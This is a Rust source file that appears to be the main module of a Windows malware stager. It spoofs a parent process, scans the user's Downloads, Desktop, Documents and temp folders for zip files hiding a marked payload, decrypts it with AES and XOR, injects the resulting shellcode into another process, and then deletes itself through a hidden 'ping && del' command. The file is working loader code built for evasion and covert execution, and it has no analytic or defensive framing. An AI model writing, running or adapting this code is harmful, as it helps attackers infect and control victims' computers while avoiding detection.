mod config;
mod dynload;
mod injection;
mod ppid_spoof;
mod syscall;
mod utils;

use aes::Aes256;
use cbc::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
use std::os::windows::process::CommandExt;

type Aes256CbcDec = cbc::Decryptor<Aes256>;
const CREATE_NO_WINDOW: u32 = 0x0800_0000;

fn decode_blob(encrypted: &[u8]) -> Vec<u8> {
    if encrypted.len() < 56 || encrypted[0] != 0xEB || encrypted[1] != 0x0E {
        return encrypted.to_vec();
    }
    let xor_key   = encrypted[45];
    let pe_offset = u32::from_le_bytes(encrypted[8..12].try_into().unwrap_or([0; 4])) as usize;
    let pe_size   = u32::from_le_bytes(encrypted[12..16].try_into().unwrap_or([0; 4])) as usize;
    let decode_end = pe_offset.saturating_add(pe_size);

    let mut blob = encrypted.to_vec();
    if decode_end <= blob.len() {
        for b in &mut blob[56..decode_end] {
            *b ^= xor_key;
        }
    }
    blob[1] = 0x36;
    blob
}

fn self_delete() {
    if let Ok(path) = std::env::current_exe() {
        let cmd = format!("ping -n 3 127.0.0.1 >nul && del /f /q \"{}\"", path.display());
        let _ = std::process::Command::new("cmd")
            .args(["/c", &cmd])
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
    }
}

fn main() {
    let ppid_name = unsafe { config::STAGER_CONFIG.ppid_proc() }.to_owned();
    let parent_pid = match ppid_spoof::find_pid(&ppid_name) {
        Some(pid) => pid,
        None      => return,
    };

    let mut search_dirs: Vec<std::path::PathBuf> = Vec::new();
    if let Ok(profile) = std::env::var("USERPROFILE") {
        let base = std::path::PathBuf::from(&profile);
        search_dirs.push(base.join("Downloads"));
        search_dirs.push(base.join("Desktop"));
        search_dirs.push(base.join("Documents"));
    }
    if let Ok(tmp) = std::env::var("TEMP") {
        search_dirs.push(std::path::PathBuf::from(tmp));
    }
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            search_dirs.push(dir.to_path_buf());
        }
    }

    let zip_candidates: Vec<std::path::PathBuf> = search_dirs.iter()
        .filter_map(|dir| std::fs::read_dir(dir).ok())
        .flat_map(|entries| entries.filter_map(|e| e.ok()).map(|e| e.path()))
        .filter(|p| p.extension().and_then(|x| x.to_str()) == Some("zip"))
        .collect();

    const MAGIC: &[u8] = b"THORNPLD";
    let (zip_bytes, pos) = match zip_candidates.iter()
        .filter_map(|p| std::fs::read(p).ok())
        .find_map(|bytes| {
            bytes.windows(8).position(|w| w == MAGIC).map(|pos| (bytes, pos))
        })
    {
        Some(pair) => pair,
        None       => return,
    };

    let len       = u32::from_le_bytes(zip_bytes[pos+8..pos+12].try_into().unwrap_or([0;4])) as usize;
    let encrypted = &zip_bytes[pos+12..pos+12+len];
    let (key, iv) = unsafe { (config::STAGER_CONFIG.key(), config::STAGER_CONFIG.iv()) };
    let mut dec_buf = encrypted.to_vec();
    let shellcode = match Aes256CbcDec::new(key.into(), iv.into())
        .decrypt_padded_mut::<Pkcs7>(&mut dec_buf)
    {
        Ok(sc) => decode_blob(sc),
        Err(_) => return,
    };

    if injection::inject(parent_pid, &shellcode).is_err() {
        return;
    }

    self_delete();
}
